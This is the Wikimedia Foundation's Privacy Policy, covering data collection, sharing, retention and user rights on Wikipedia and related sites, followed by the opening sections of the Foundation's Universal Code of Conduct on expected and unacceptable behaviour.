We believe that information-gathering and use should go hand-in-hand with transparency. This Privacy Policy explains how the Wikimedia Foundation, the non-profit organization that hosts the Wikimedia Sites, like Wikipedia, collects, uses, and shares information we receive from you through your use of the Wikimedia Sites. It is essential to understand that, by using any of the Wikimedia Sites, you consent to the collection, transfer, processing, storage, disclosure, and use of your information as described in this Privacy Policy. That means that reading this Policy carefully is important.

We believe that you should not have to provide nonpublic Personal Information to participate in the free knowledge movement. You do not have to provide things like your real name, address, or date of birth to sign up for a standard account or contribute content to the Wikimedia Sites.

We do not sell or rent your Personal Information, nor do we give it to others to sell you anything. We use it to figure out how to make the Wikimedia Sites more engaging and accessible, to see which ideas work, and to make learning and contributing more fun. Put simply: we use this information to make the Wikimedia Sites better for you.

After all, it is people like you, the champions of free knowledge, who make it possible for the Wikimedia Sites to not only exist, but also grow and thrive.



DEFINITIONS

Back to top


We recognize that only a minority of you are familiar with technical terms like "tracking pixels" and "cookies" used in the Privacy Policy.

Whether you are brand new to privacy terminology or you are an expert who just wants a refresher, you might find our Glossary of Key Terms helpful.

Because everyone (not just lawyers) should be able to easily understand how and why their information is collected and used, we use common language instead of more formal terms throughout this Policy. To help ensure your understanding of some particular key terms, here is a table of translations:




When we say... ...we mean: "the Wikimedia Foundation" / "the Foundation" / "we" / "us" / "our" The Wikimedia Foundation, Inc., the non-profit organization that operates the Wikimedia Sites. "Wikimedia Sites" / "our services" Wikimedia websites and services (regardless of language), including our main projects, such as Wikipedia and Wikimedia Commons, as well as mobile applications, Application Programming Interfaces (APIs), emails, and notifications; excluding, however, sites and services listed in the "What This Privacy Policy Does Not Cover" section below. "you" / "your" / "me" You, regardless of whether you are an individual, group, or organization, and regardless of whether you are using the Wikimedia Sites or our services on behalf of yourself or someone else. "this Policy" / "this Privacy Policy" This document, entitled the "Wikimedia Foundation Privacy Policy". "contributions" Content you add or changes you make to any Wikimedia Sites. "Personal information" Information you provide us or information we collect that could be used to personally identify you. To be clear, while we do not necessarily collect all of the following types of information, we consider at least the following to be "personal information" if it is otherwise nonpublic and can be used to identify you: (a) your real name, address, phone number, email address, password, identification number on government-issued ID, IP address, user-agent information, payment account number; (b) when associated with one of the items in subsection (a), any sensitive data such as date of birth, gender, sexual orientation, racial or ethnic origins, marital or familial status, medical conditions or disabilities, political affiliation, and religion. "third party" / "third parties" Individuals, entities, websites, services, products, and applications that are not controlled, managed, or operated by the Wikimedia Foundation. This includes other Wikimedia users and independent organizations or groups who help promote the Wikimedia movement such as Wikimedia chapters, thematic organizations, and user groups as well as volunteers, employees, directors, officers, grant recipients, and contractors of those organizations or groups.




WHAT THIS PRIVACY POLICY DOES AND DOES NOT COVER

Except as explained below, this Privacy Policy applies to our collection and handling of information about you that we receive as a result of your use of any of the Wikimedia Sites. This Policy also applies to information that we receive from our partners or other third parties. To understand more about what this Privacy Policy covers, please see below.

Examples of What This Privacy Policy Covers

For the sake of clarity, this Privacy Policy covers, regardless of language:

 * All of our major sites (found at list of major projects), such as Wikipedia, including user pages, discussion pages, and noticeboards.
 * Our blogs and APIs (unless we have provided a separate policy for those services).
 * Official Wikimedia Foundation mobile applications.
 * Emails, SMS, and notifications from us or sent to us from you.

This Privacy Policy, however, does not cover some situations where we may gather or process information. For example, some uses may be covered by separate privacy policies (like those of the Wikimedia Shop) or sites or services run by third parties (such as third-party developer projects on Wikimedia Cloud Services). To understand more about what this Privacy Policy does not cover, please see below.



More on what the Wikimedia Foundation Privacy Policy does not cover

This section is part of the Privacy Policy and is meant to explain in detail which situations are not covered by our Privacy Policy.

Wikimedia Sites and Tools with alternative policies Some Wikimedia Foundation websites or tools have alternative privacy policies or provisions that differ from this Privacy Policy. These websites include:
 * Wikipedia Store (covered by the shop's policy);
 * donate.wikimedia.org, including the donation process, such as clicking on a donation banner (covered by the Donor Privacy Policy); and
 * The Wikipedia Reading Lists Browser Extension, which is governed by a separate Privacy Policy. This separate policy will also be made available where the Extension can be downloaded.

If a Wikimedia Foundation website is governed by an alternative privacy policy, it will link to such policy. When a Wikimedia Foundation tool is governed by an alternative privacy policy, the page where the tool may be downloaded or enabled will include a link to that policy. Community members The Wikimedia Sites are collaborative labors of love that are constantly maintained and updated by a global community of volunteers. This global community of volunteers may sometimes have access to personal Information in order to ensure the functioning of the Wikimedia Sites.
 * Administrative volunteers, such as CheckUsers or Stewards. These are volunteers who enforce Wikimedia Site policies and ensure the safety of the Wikimedia Sites. When these administrators access Personal Information that is nonpublic, they are required to comply with our Access to nonpublic personal data policy, as well as other, tool-specific policies.
 * Tool providers. We support platforms for third-party developers to experiment and develop new tools and sites, such as wmflabs.org. When you use one of the tools developed by these volunteers, you may transfer information to them. When these volunteers access nonpublic information or Personal Information, they are required to comply with the terms governing the particular platform the tool is available on.
 * Other users. We provide several tools that allow users to communicate with each other. The communications may be covered by this Policy while they pass through our systems, but the users who receive these communications, and what they do with the communications once they receive them, are not covered by this Policy. Examples include:
   * posting to Foundation-hosted email lists;
   * requesting support from volunteers through our online ticketing system (email sent to infowikimedia.org goes to this system);
   * emailing other users through the Wikimedia Sites (for example, by using the "Email this user" feature); and
   * chatting on IRC (such as on the #wikipedia channel).

Third parties This Privacy Policy only covers the way the Wikimedia Foundation collects, uses and discloses Personal Information and does not address the practices of third parties. For example, this Privacy Policy does not address the practices of:
 * Websites run by other organizations, like websites linked to from the "References" sections of Wikipedia, or run by Wikimedia chapters or other movement organizations. These organizations may receive information from you if you visit their websites after using one of the Wikimedia Sites. They are governed by their own privacy policies.
 * Mobile applications provided by other organizations or individuals. These organizations or individuals may receive information from you if you use those applications to access the Wikimedia Sites or Wikimedia Site content. They are governed by their own privacy policies.

Sometimes, volunteers may place a data-collecting tool, such as a script, gadget, tracking pixel, or share button, on a Wikimedia Site without our knowledge. This Policy does not cover how third parties handle the information they receive as a result of such a tool. If you come across such a third-party tool, and you believe it violates this Policy, you can remove the tool yourself, or report it to privacywikimedia.org so we can investigate.

Where community policies govern information, such as the CheckUser policy, the relevant community may add to the rules and obligations set out in this Policy. However, they are not permitted to create new exceptions or otherwise reduce the protections offered by this Policy.

COLLECTION & USE OF INFO


TYPES OF INFORMATION WE RECEIVE FROM YOU & HOW WE GET IT



YOUR PUBLIC CONTRIBUTIONS



Whatever you post on Wikimedia Sites can be seen and used by everyone.

When you make a contribution to any Wikimedia Site, including on user or discussion pages, you are creating a permanent, public record of every piece of content added, removed, or altered by you. The page history will show when your contribution or deletion was made, as well as your username (if you are signed in) or your IP address (if you are not signed in). We may use your public contributions, either aggregated with the public contributions of others or individually, to create new features or data-related products for you or to learn more about how the Wikimedia Sites are used, as further explained below in the "How We Use Information We Receive From You" section of this Privacy Policy.

Publicly Visible Information

Unless this Policy says otherwise, you should assume that information that you actively contribute to the Wikimedia Sites, including Personal Information, is publicly visible and can be found by search engines. Like most things on the Internet, anything you share may be copied and redistributed throughout the Internet by other people. Please do not contribute any information that you are uncomfortable making permanently public, like revealing your real name or location in your contributions.

You should be aware that specific data made public by you or aggregated data that is made public by us can be used by anyone for analysis and to infer further information, such as which country a user is from, political affiliation and gender.

Back to top


ACCOUNT INFORMATION & REGISTRATION



You do not need to create an account to use any Wikimedia Site.

If you do create an account, you do not need to give us your name or email address (although you can if you choose to, such as for the "Email this user" feature for example).

If you do not create an account, your contributions will be publicly attributed to your IP address.

Want to create an account? Great! Do not want to create an account? No problem!

You are not required to create an account to read or contribute to a Wikimedia Site, except under rare circumstances. However, if you contribute without signing in, your contribution will be publicly attributed to the IP address associated with your device.

If you want to create a standard account, in most cases we require only a username and a password. However, if you choose not to provide an email address, we cannot help you recover your password.

More on Usernames

Your username will be publicly visible, so please be careful about revealing your real name or other Personal Information in your username. Your password is only used to verify that the account is yours. Your IP address is also automatically submitted to us, and we record it temporarily. This is to protect Wikimedia users and project content; in the event of abuse, IP addresses may be associated with usernames as part of an investigation. No other Personal Information is required: no name, no email address, no date of birth, and no credit card information.

Once created, user accounts cannot be removed entirely (although you can usually hide the information on your user page if you choose to). This is because your public contributions must be associated with their author (you!). In some circumstances, the Wikimedia communities can assist users with removing additional information related to their account from the projects.

To gain a better understanding of the demographics of our users, to localize our services and to learn how we can improve our services, we may ask you for more demographic information, such as gender or age, about yourself. We will tell you if such information is intended to be public or private, so that you can make an informed decision about whether you want to provide us with that information. Providing such information is always completely optional. If you do not want to, you do not have to—it is as simple as that.

LOCATION INFORMATION



GPS & OTHER LOCATION TECHNOLOGIES



Some features we offer work better if we know what area you are in.

If you consent, we can use GPS (and other technologies commonly used to determine location) to show you more relevant content. We keep information obtained by these technologies confidential, except as provided in this Policy. You can learn more by checking out the list of examples of how we use these technologies in our FAQ.

Back to top


METADATA



Sometimes, we automatically receive location data from your device. For example, if you want to upload a photo on the Wikimedia Commons mobile app, we may receive metadata, such as the place and time you took the photo, automatically from your device. Please be aware that, unlike location information collected using GPS signals described above, the default setting on your mobile device typically includes the metadata in your photo or video upload to the Wikimedia Sites. If you do not want metadata sent to us and made public at the time of your upload, please change your settings on your device.

Back to top


IP ADDRESSES



Finally, when you visit any Wikimedia Site, we automatically receive the IP address of the device (or your proxy server) you are using to access the Internet, which could be used to infer your geographical location.

Back to top



INFORMATION RELATED TO YOUR USE OF THE WIKIMEDIA SITES



We use certain technologies to collect information about how you use Wikimedia Sites.

Like other websites, we receive some information about you automatically when you visit the Wikimedia Sites.

We also use a variety of commonly-used technologies, like cookies, to collect information regarding how you use the Wikimedia Sites, make our services safer and easier to use, and to help create a better and more customizable experience for you.

We want to make the Wikimedia Sites better for you by learning more about how you use them. Examples of this might include how often you visit the Wikimedia Sites, what you like, what you find helpful, how you get to the Wikimedia Sites, and whether you would use a helpful feature more if we explained it differently. We also want this Policy and our practices to reflect our community's values. For this reason, we keep information related to your use of the Wikimedia Sites confidential, except as provided in this Policy.

Back to top


INFORMATION WE RECEIVE AUTOMATICALLY



Because of how browsers work, we receive some information automatically when you visit the Wikimedia Sites. This includes when you use an online tool on a third-party site that loads information coming from the Wikimedia Sites. This information includes the type of device you are using (possibly including unique device identification numbers, for some beta versions of our mobile applications), the type and version of your browser, your browser's language preference, the type and version of your device's operating system, in some cases the name of your internet service provider or mobile carrier, the website that referred you to the Wikimedia Sites, which pages you request and visit, and the date and time of each request you make to the Wikimedia Sites.

Put simply, we use this information to enhance your experience with Wikimedia Sites. For example, we use this information to administer the sites, provide greater security, and fight vandalism; optimize mobile applications, customize content and set language preferences, test features to see what works, and improve performance; understand how users interact with the Wikimedia Sites, track and study use of various features, gain understanding about the demographics of the different Wikimedia Sites, and analyze trends.

Back to top


INFORMATION WE COLLECT



We use a variety of commonly-used technologies, like cookies, to understand how you use the Wikimedia Sites, make our services safer and easier to use, and to help create a better and more customizable experience for you.

We actively collect some types of information with a variety of commonly-used technologies. These generally include tracking pixels, JavaScript, and a variety of "locally stored data" technologies, such as cookies and local storage. These types of technologies may also be used in online tools on a third-party site that loads information from the Wikimedia Sites. We realize that some of these technologies do not have the best reputation in town and can be used for less-than-noble purposes. So we want to be as clear as we can about why we use these methods and the type of information we collect with them.

Depending on which technology we use, locally stored data may include text, Personal Information (like your IP address), and information about your use of the Wikimedia Sites (like your username or the time of your visit). See below for more information.

We use this information to make your experience with the Wikimedia Sites safer and better, to gain a greater understanding of user preferences and their interaction with the Wikimedia Sites, and to generally improve our services. We will never use third-party cookies, unless we get your permission to do so. If you ever come across a third-party data collection tool that has not been authorized by you (such as one that may have been mistakenly placed by another user or administrator), please report it to us at privacy@wikimedia.org.

More on Locally Stored Data

Locally stored data, JavaScript, and tracking pixels help us do things like:

 * Provide you with a customizable experience, such as using cookies to know your language preference, to remember the user preferences you set so we can provide you with the customized look and feel that you want, and to tell you about interesting Wikimedia issues and events in your area.
 * Deliver more relevant content to you faster. For example, we use local storage to store your most recently read articles directly on your device, so they can be retrieved quickly. Also, we use cookies to learn about the topics searched so that we can optimize the search results we deliver to you.
 * Understand how you use the Wikimedia Sites, so that we know what works and what is useful. For example, we might use cookies to learn about the list of articles you are following on your watchlist so that we can recommend similar articles that you may be interested in.
 * Understand how you use the Wikimedia Sites across different devices, so that we can make our varied Wikimedia Sites more efficient and effective for you.
 * Make the Wikimedia Sites more convenient to use, such as by using cookies to maintain your session when you log in or to remember your username in the login field.

Want to know even more? You can read more about some of the specific cookies we use, when they expire, and what we use them for in our FAQ.

We believe this data collection helps improve your user experience, but you may remove or disable some or all locally stored data through your browser settings, depending on your browser. You can learn more about some options you have in our FAQ. While locally stored data may not be necessary to use our sites, some features will not function properly if you disable locally stored data.

While the examples above concerning information about you collected through the use of data collection tools are kept confidential in accordance with this Policy, please note that some information about the actions taken by your username is made publicly available through public logs alongside actions taken by other users. For example, a public log may include the date your account was created on a Wikimedia Site along with the dates that other accounts were created on a Wikimedia Site.

OTHER



LOCATION INFORMATION



GPS & OTHER LOCATION TECHNOLOGIES



As stated above, we can use commonly-used location technologies to show you more relevant content. For example, our mobile apps can identify articles from the Wikimedia sites about points of interest near your location. As a reminder, you can consent to and/or deactivate our access to these location technologies at any time for example through the native OS functionalities on your mobile device, and still use the Wikimedia Sites.

Back to top


METADATA



As stated above, we may automatically receive location data from your device. For example, if you upload a photo using the Wikimedia Commons mobile app, please be aware that the default setting on your mobile device typically results in the metadata associated with your photo being included in the upload. As a reminder, if you do not want metadata sent to us and made public at the time of your upload, please change your settings on your device.

Back to top


IP ADDRESSES



When you visit any Wikimedia Site, we automatically receive the IP address of the device (or your proxy server) you are using to access the Internet, which could be used to infer your geographical location. We keep IP addresses confidential, except as provided in this Policy. If you are visiting Wikimedia Sites with your mobile device, we may use your IP address to provide anonymized or aggregated information to service providers regarding the volume of usage in certain areas.

We use this location information to make your experience with the Wikimedia Sites safer and better, to gain a greater understanding of user preferences and their interaction with the Wikimedia Sites, and to generally improve our services. For example, we use this information to provide greater security, optimize mobile applications, and learn how to expand and better support Wikimedia communities. We also use Personal Information in the manner described in the sections of this Policy titled "For Legal Reasons" and "To Protect You, Ourselves & Others."

Back to top





SHARING


WHEN MAY WE SHARE YOUR INFORMATION?



We use and share your Personal Information when you give us specific permission to do so, for legal reasons, and in the other circumstances described below.

WITH YOUR PERMISSION



We share your Personal Information for a particular purpose, if you agree. For example, if you receive a scholarship and we ask permission to share your Personal Information with a local chapter. You can find more information in the list of examples in our FAQ.

Back to top


FOR LEGAL REASONS



We will disclose your Personal Information to public authorities or other persons in response to an official legal process only if we believe it to be legally valid. See also our Requests for user information procedures and guidelines. We will notify you of such requests when possible. We do so to further our legitimate interest and/or to comply with our legal obligations.

We will access, use, preserve, and/or disclose your Personal Information if we reasonably believe it necessary to satisfy a valid and legally enforceable warrant, subpoena, court order, law or regulation, or other judicial or administrative order. However, if we believe that a particular request for disclosure of a user's information is legally invalid or an abuse of the legal system and the affected user does not intend to oppose the disclosure themselves, we will try our best to fight it. We are committed to notifying you via email at least ten (10) calendar days, when possible, before we disclose your Personal Information in response to a legal demand. However, we may only provide notice if we are not legally restrained from contacting you, there is no credible threat to life or limb that is created or increased by disclosing the request, and you have provided us with an email address.

Nothing in this Privacy Policy is intended to limit any legal objections or defenses you may have to a third-party's request (whether it be civil, criminal, or governmental) to disclose your Personal Information. We recommend seeking the advice of legal counsel immediately if such a request is made involving you.

For more information, see our Subpoena FAQ.

Back to top


IF THE ORGANIZATION IS TRANSFERRED (REALLY UNLIKELY!)



In the unlikely event that the ownership of the Foundation changes, we will provide you 30 days' notice before any Personal Information is transferred to the new owners or becomes subject to a different privacy policy.

In the extremely unlikely event that ownership of all or substantially all of the Foundation changes, or we go through a reorganization (such as a merger, consolidation, or acquisition), consistent with our legitimate interest, we will continue to keep your Personal Information confidential, except as provided in this Policy, and provide notice to you via the Wikimedia Sites and a notification on WikimediaAnnounce-L or similar mailing list at least thirty (30) calendar days before any Personal Information is transferred or becomes subject to a different privacy policy.

Back to top


TO PROTECT YOU, OURSELVES & OTHERS



We, or users with certain administrative rights, use and disclose Personal Information that is reasonably necessary to:

 * enforce or investigate potential violations of the Wikimedia Foundation or community-based policies;
 * protect our organization, infrastructure, employees, contractors, or the public; or
 * prevent imminent or serious bodily harm or death to a person.

We do so to manage our relationship with you, to further our legitimate interest, and/or to comply with our legal obligations.

We, or particular users with certain administrative rights as described below, need to use and share your Personal Information if it is reasonably believed to be necessary to enforce or investigate potential violations of our Terms of Use, this Privacy Policy, or any Wikimedia Foundation or user community-based policies. We may also need to access and share Personal Information to investigate and defend ourselves against legal threats or actions.

Wikimedia Sites are collaborative, with users writing most of the policies and selecting from amongst themselves people to hold certain administrative rights. These rights may include access to limited amounts of otherwise nonpublic information about recent contributions and activity by other users. They use this access to help protect against vandalism and abuse, fight harassment of other users, and generally try to minimize disruptive behavior on the Wikimedia Sites. These various user-selected administrative groups have their own privacy and confidentiality guidelines, but all such groups are supposed to agree to follow our Access to nonpublic personal data policy. These user-selected administrative groups are accountable to other users through checks and balances: users are selected through a community-driven process and overseen by their peers through a logged history of their actions. However, the legal names of these users are not known to the Wikimedia Foundation.

We hope that this never comes up, but we may disclose your Personal Information if we believe that it is reasonably necessary to prevent imminent and serious bodily harm or death to a person, or to protect our organization, employees, contractors, users, or the public. We may also disclose your Personal Information if we reasonably believe it necessary to detect, prevent, or otherwise assess and address potential spam, malware, fraud, abuse, unlawful activity, and security or technical concerns. (Check out the list of examples in our FAQ for more information.)

Back to top


TO OUR SERVICE PROVIDERS



We disclose Personal Information to our third-party service providers or contractors to help run or improve the Wikimedia Sites and provide services in support of our mission.

We use third-party service providers or contractors to help run or improve the Wikimedia Sites for you and other users. We give access to your Personal Information to these providers or contractors as needed to perform their services for us or to use their tools and services. We put requirements, such as confidentiality agreements, in place to help ensure that these service providers treat your Personal Information consistently with, and no less protective of your privacy than, the principles of this Policy. For further information, please see our FAQ.

If you are visiting Wikimedia Sites with your mobile device, we use your IP address to provide anonymized or aggregated information to service providers regarding the volume of usage in certain areas.

Some of our service providers ask us to post links to their privacy policies; a list of these service providers and links to their policies can be found on this page.

Back to top


TO UNDERSTAND & EXPERIMENT


 * We give volunteer developers and researchers access to systems that contain your Personal Information to allow them to protect, develop, and contribute to the Wikimedia Sites.
 * We also share non-Personal Information or aggregated information with third parties interested in studying the Wikimedia Sites.
 * When we share Personal Information with third parties for these purposes, we put reasonable technical and contractual protections in place to protect your Personal Information consistent with this Policy and our legitimate interest.

The open-source software that powers the Wikimedia Sites depends on the contributions of volunteer software developers, who spend time writing and testing code to help it improve and evolve with our users' needs. To facilitate their work, we give some developers limited access to systems that contain your Personal Information, but only as reasonably necessary for them to develop and contribute to the Wikimedia Sites.

Similarly, we share non-Personal Information or aggregated information with researchers, scholars, academics, and other interested third parties who wish to study the Wikimedia Sites. Sharing this Personal Information helps them understand usage, viewing, and demographics statistics and patterns. They then can share their findings with us and our users so that we can all better understand and improve the Wikimedia Sites.

When we give access to Personal Information to third-party developers or researchers, we put requirements, such as reasonable technical and contractual protections, in place to help ensure that these service providers treat your Personal Information consistently with the principles of this Policy and in accordance with our instructions. If these developers or researchers later publish their work or findings, we ask that they not disclose your Personal Information. Please note that, despite the obligations we impose on developers and researchers, we cannot guarantee that they will abide by our agreement, nor do we guarantee that we will regularly screen or audit their projects. (You can learn more about re-identification in our FAQ.)

Back to top


BECAUSE YOU MADE IT PUBLIC



Information that you post is public and can be seen and used by everyone.

Any information you post publicly on the Wikimedia Sites is just that – public. For example, if you put your mailing address on your talk page, that is public, and not specifically protected by this Policy. And if you edit without registering or logging into your account, your IP address will be seen publicly. Please think carefully about your desired level of privacy before you disclose Personal Information on your user page or elsewhere.

PROTECTION


HOW DO WE PROTECT YOUR PERSONAL INFORMATION?



We use a variety of physical and technical measures, policies, and procedures to help protect your Personal Information from unauthorized access, use, or disclosure.

We strive to protect your Personal Information from unauthorized access, use, or disclosure. We use a variety of physical and technical measures, policies, and procedures (such as access control procedures, network firewalls, and physical security) designed to protect our systems and your Personal Information. Unfortunately, there is no such thing as completely secure data transmission or storage, so we cannot guarantee that our security will not be breached (by technical measures or through violation of our policies and procedures).

We will never ask for your password by email (but may send you a temporary password via email if you have requested a password reset). If you ever receive an email that requests your password, please let us know by sending it to privacy@wikimedia.org, so we can investigate the source of the email.

Back to top



HOW LONG DO WE KEEP YOUR DATA?



Except as otherwise stated in this Policy, we only keep your Personal Information as long as necessary to maintain, understand and improve the Wikimedia Sites or to comply with applicable law.

Once we receive Personal Information from you, we keep it for the shortest possible time that is consistent with the maintenance, understanding, and improvement of the Wikimedia Sites, and our obligations under applicable law. In most instances, Personal Information is deleted, aggregated or de-identified after 90 days. Non-Personal Information may be retained indefinitely as appropriate. (Check out the list of examples in our FAQ.)

Please remember that when you make a contribution to any Wikimedia Site, the page history will show when your contribution was made, your username (if you are signed in), or your IP address (if you edit while not logged in). The transparency of the projects' contribution and revision histories is critical to their efficacy and trustworthiness. To learn more about our data retention practices, see our data retention guidelines.

YOUR RIGHTS



If you would like to request access to or removal of your Personal Information, you may contact us.

For information about how you may request removal of your Personal Information, or other rights you may have with respect to your Personal Information, see our FAQ. If you would like to request to access, update or restrict/object to the processing of Personal Information, or receive a copy of your Personal Information for purposes of transmitting it to another organization, you may Contact Us. We will respond to your request consistent with applicable law.

Please note also that you may be able to exercise some of these rights without our intervention. For example, if you are a registered user, you can access and update some Personal Information in your Preferences, as well as download your user account data. You may also manage what kinds of notifications you receive and how often you receive them by going to your Notifications Preferences.

IMPORTANT INFO

For the protection of the Wikimedia Foundation and other users, if you do not agree with this Privacy Policy, you may not use the Wikimedia Sites.




WHERE IS THE FOUNDATION & WHAT DOES THAT MEAN FOR ME?



The Wikimedia Foundation is a non-profit organization based in San Francisco, California, with servers and data centers located in the U.S. If you decide to use Wikimedia Sites, whether from inside or outside of the U.S., you understand that your Personal Information will be collected, transferred, stored, processed, disclosed and otherwise used in the U.S. as described in this Privacy Policy.

CHANGES TO THIS PRIVACY POLICY

Prior to the start of any comment period, we will provide notice of such changes and the opportunity to comment via the Wikimedia Sites, and via a notification on WikimediaAnnounce-L or a similar mailing list.
 * For minor changes, such as grammatical fixes, administrative or legal changes, or corrections of inaccurate statements, we will post the changes and, when possible, provide at least three (3) calendar days' prior notice via WikimediaAnnounce-L or similar mailing list.

We ask that you please review the most up-to-date version of our Privacy Policy. Your continued use of the Wikimedia Sites after any effective date of a subsequent version of this Privacy Policy constitutes acceptance of this Privacy Policy on your part.

This policy is approved by the Wikimedia Foundation Board of Trustees.


It may not be circumvented, eroded, or ignored by Wikimedia Foundation officers or staff nor local policies of any Wikimedia project.
Per resolution by the Foundation's Board, the Universal Code of Conduct (UCoC) applies to all Wikimedia projects and spaces as well as Foundation activities, including events it hosts and events it funds or supports with other resources.


Please note that in the event of any differences in meaning or interpretation between the original English version of this content and a translation, the original English version takes precedence.

Wikimedia Foundation Universal Code of Conduct

 * Enforcement guidelines
 * Coordinating Committee (U4C) (charter)

 * Training modules


WHY WE HAVE A UNIVERSAL CODE OF CONDUCT

We believe in empowering as many people as possible to actively participate in Wikimedia projects and spaces, to reach our vision of a world in which everyone can share in the sum of all human knowledge. We believe our communities of contributors should be as diverse, inclusive, and accessible as possible. We want these communities to be positive, safe and healthy environments for anyone who joins (and wants to join) them. We are committed to ensuring that it remains so, including by embracing this Code of Conduct and revisiting for updates as needed. Also, we wish to protect our projects against those who damage or distort the content.

In line with the Wikimedia mission, all who participate in Wikimedia projects and spaces will:

 * Help create a world in which everyone can freely share in the sum of all knowledge
 * Be part of a global community that will avoid bias and prejudice, and
 * Strive towards accuracy and verifiability in all its work

This Universal Code of Conduct (UCoC) defines a minimum set of guidelines of expected and unacceptable behaviour. It applies to everyone who interacts and contributes to online and offline Wikimedia projects and spaces. This includes new and experienced contributors, functionaries within the projects, event organizers and participants, employees and board members of affiliates and employees and board members of the Wikimedia Foundation. It applies to all Wikimedia projects, technical spaces, in-person and virtual events, as well as the following instances:

 * Private, public and semi-public interactions
 * Discussions of disagreement and expression of solidarity across community members
 * Issues of technical development
 * Aspects of content contribution
 * Cases of representing affiliates/communities with external partners


1 – INTRODUCTION

The Universal Code of Conduct provides a baseline of behaviour for collaboration on Wikimedia projects worldwide. Communities may add to this to develop policies that take account of local and cultural context, while maintaining the criteria listed here as a minimum standard.

The Universal Code of Conduct applies equally to all Wikimedians without any exceptions. Actions that contradict the Universal Code of Conduct can result in sanctions. These may be imposed by designated functionaries (as appropriate in their local context) and/or by the Wikimedia Foundation as the legal owner of the platforms.


2 – EXPECTED BEHAVIOUR

Every Wikimedian, whether they are a new or experienced editor, a community functionary, an affiliate or Wikimedia Foundation board member or employee, is responsible for their own behaviour.

In all Wikimedia projects, spaces and events, behaviour will be founded in respect, civility, collegiality, solidarity and good citizenship. This applies to all contributors and participants in their interaction with all contributors and participants, without exceptions based on age, mental or physical disabilities, physical appearance, national, religious, ethnic and cultural background, caste, social class, language fluency, sexual orientation, gender identity, sex or career field. Nor will we make exceptions based on standing, skills or accomplishments in the Wikimedia projects or movement.


2.1 – MUTUAL RESPECT

We expect all Wikimedians to show respect for others. In communicating with people, whether in online or offline Wikimedia environments, we will treat each other with mutual respect.

This includes but is not limited to:

 * Practice empathy. Listen and try to understand what Wikimedians of different backgrounds want to tell you. Be ready to challenge and adapt your own understanding, expectations and behaviour as a Wikimedian.
 * Assume good faith, and engage in constructive edits; your contributions should improve the quality of the project or work. Provide and receive feedback kindly and in good faith. Criticism should be delivered in a sensitive and constructive manner. All Wikimedians should assume unless evidence otherwise exists that others are here to collaboratively improve the projects, but this should not be used to justify statements with a harmful impact.
 * Respect the way that contributors name and describe themselves. People may use specific terms to describe themselves. As a sign of respect, use these terms when communicating with or about these people, where linguistically or technically feasible. Examples include:
   * Ethnic groups may use a specific name to describe themselves, rather than the name historically used by others;
   * People may have names that use letters, sounds, or words from their language which may be unfamiliar to you;
   * People who identify with a certain sexual orientation or gender identity using distinct names or pronouns;
   * People having a particular physical or mental disability may use particular terms to describe themselves
 * During in-person meetings, we will be welcoming to everyone and we will be mindful and respectful of each other's preferences, boundaries, sensibilities, traditions and requirements.


2.2 – CIVILITY, COLLEGIALITY, MUTUAL SUPPORT AND GOOD CITIZENSHIP

We strive towards the following behaviours:

 * Civility is politeness in behaviour and speech amongst people, including strangers.
 * Collegiality is the friendly support that people engaged in a common effort extend to each other.
 * Mutual support and good citizenship means taking active responsibility for ensuring that the Wikimedia projects are productive, pleasant and safe spaces, and contribute to the Wikimedia mission.

This includes but is not limited to:

 * Mentorship and coaching: Helping newcomers to find their way and acquire essential skills.
 * Looking out for fellow contributors: Lend them a hand when they need support, and speak up for them when they are treated in a way that falls short of expected behaviour as per the Universal Code of Conduct.
 * Recognize and credit the work done by contributors: Thank them for their help and work. Appreciate their efforts and give credit where it is due.


3 – UNACCEPTABLE BEHAVIOUR

The Universal Code of Conduct aims to help community members identify situations of bad behaviour. The following behaviours are considered unacceptable within the Wikimedia movement:


3.1 – HARASSMENT

This includes any behaviour intended primarily to intimidate, outrage or upset a person, or any behaviour where this would reasonably be considered the most likely main outcome. Behaviour can be considered harassment if it is beyond what a reasonable person would be expected to tolerate in a global, intercultural environment. Harassment often takes the form of emotional abuse, especially towards people who are in a vulnerable position, and may include contacting workplaces or friends and family members in an effort to intimidate or embarrass. In some cases, behaviour that would not rise to the level of harassment in a single case can become harassment through repetition. Harassment includes but is not limited to:

 * Insults: This includes name calling, using slurs or stereotypes, and any attacks based on personal characteristics. Insults may refer to perceived characteristics like intelligence, appearance, ethnicity, race, religion (or lack thereof), culture, caste, sexual orientation, gender, sex, disability, age, nationality, political affiliation, or other characteristics. In some cases, repeated mockery, sarcasm, or aggression constitute insults collectively, even if individual statements would not.
 * Sexual harassment: Sexual attention or advances of any kind towards others where the person knows or reasonably should know that the attention is unwelcome or in situations where consent cannot be communicated.
 * Threats: Explicitly or implicitly suggesting the possibility of physical violence, unfair embarrassment, unfair and unjustified reputational harm, or intimidation by suggesting gratuitous legal action to win an argument or force someone to behave the way you want.
 * Encouraging harm to others: This includes encouraging someone else to commit self-harm or suicide as well as encouraging someone to conduct violent attacks on a third party.
 * Disclosure of personal data (Doxing): sharing other contributors' private information, such as name, place of employment, physical or email address without their explicit consent either on the Wikimedia projects or elsewhere, or sharing information concerning their Wikimedia activity outside the projects.
 * Hounding: following a person across the project(s) and repeatedly critiquing their work mainly with the intent to upset or discourage them. If problems are continuing after efforts to communicate and educate, communities may need to address them through established community processes.
 * Trolling: Deliberately disrupting conversations or posting in bad-faith to intentionally provoke.


3.2 – ABUSE OF POWER, PRIVILEGE, OR INFLUENCE

Abuse occurs when someone in a real or perceived position of power, privilege, or influence engages in disrespectful, cruel, and/or violent behaviour towards other people. In Wikimedia environments, it may take the form of verbal or psychological abuse and may overlap with harassment.

 * Abuse of office by functionaries, officials and staff: use of authority, knowledge, or resources at the disposal of designated functionaries, as well as officials and staff of the Wikimedia Foundation or Wikimedia affiliates, to intimidate or threaten others.
 * Abuse of seniority and connections: Using one's position and reputation to intimidate others. We expect people with significant experience and connections in the movement to behave with special care because hostile comments from them may carry an unintended backlash. People with community authority have a particular privilege to be viewed as reliable and should not abuse this to attack others who disagree with them.
 * Psychological manipulation: Maliciously causing someone to doubt their own perceptions, senses, or understanding with the objective to win an argument or force someone to behave the way you want.


3.3 – CONTENT VANDALISM AND ABUSE OF THE PROJECTS

Deliberately introducing biased, false, inaccurate or inappropriate content, or hindering, impeding or otherwise hampering the creation (and/or maintenance) of content. This includes but is not limited to:

 * The repeated arbitrary or unmotivated removal of any content without appropriate discussion or providing explanation
 * Systematically manipulating content to favour specific interpretations of facts or points of view (also by means of unfaithful or deliberately false rendering of sources and altering the correct way of composing editorial content)
 * Hate speech in any form, or discriminatory language aimed at vilifying, humiliating, inciting hatred against individuals or groups on the basis of who they are or their personal beliefs
